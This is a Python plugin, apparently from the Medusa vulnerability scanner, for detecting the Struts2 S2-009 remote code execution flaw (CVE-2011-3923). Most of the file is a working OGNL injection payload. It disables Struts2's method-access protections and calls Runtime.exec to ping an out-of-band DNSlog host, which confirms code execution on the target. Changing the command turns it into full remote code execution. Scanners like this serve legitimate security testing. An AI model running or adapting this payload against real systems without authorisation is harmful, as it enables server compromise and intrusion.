#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Dnslog
import urllib3
import requests
import time
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2011-3923" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2012-1-20'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability9"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞9' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "Struts2对s2-003的修复方法是禁止#号，于是s2-005通过使用编码\\u0023或\\43来绕过；于是Struts2对s2-005的修复方法是禁止\等特殊符号，使用户不能提交反斜线。S2-009是对05和03的绕过"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "2.1.0-2.3.1.1"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果


def medusa(**kwargs)->None:
    url = kwargs.get("Url")  # 获取传入的url参数
    Headers = kwargs.get("Headers")  # 获取传入的头文件
    proxies = kwargs.get("Proxies")  # 获取传入的代理参数
    DL=Dnslog()
    payload="""?age=medusa&name=%28%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D+new+java.lang.Boolean%28false%29,%20%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3D+new+java.lang.Boolean%28true%29,%20@java.lang.Runtime@getRuntime%28%29.exec%28%27ping%20{}%27%29%29%28meh%29&z%5B%28name%29%28%27meh%27%29%5D=true""".format(DL.dns_host())
    try:
        payload_url = url+payload

        resp = requests.get(payload_url,headers=Headers, timeout=6,proxies=proxies, verify=False)
        con = resp.text
        time.sleep(3)
        if DL.result():
            Medusa = "{} 存在Struts2远程代码执行漏洞(S2-009)\r\n漏洞详情:\r\n版本号:S2-009\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(url,payload_url,con,DL.dns_text(),DL.dns_host())
            _t=VulnerabilityInfo(Medusa)
            VulnerabilityDetails(_t.info, resp,**kwargs).Write()  # 传入url和扫描到的数据
            WriteFile().result(str(url),str(Medusa))#写入文件，url为目标文件名统一传入，Medusa为结果
    except Exception as e:
        _ = VulnerabilityInfo('').info.get('algroup')
        ErrorHandling().Outlier(e, _)
        _l = ErrorLog().Write("Plugin Name:"+_+" || Target Url:"+url,e)#调用写入类

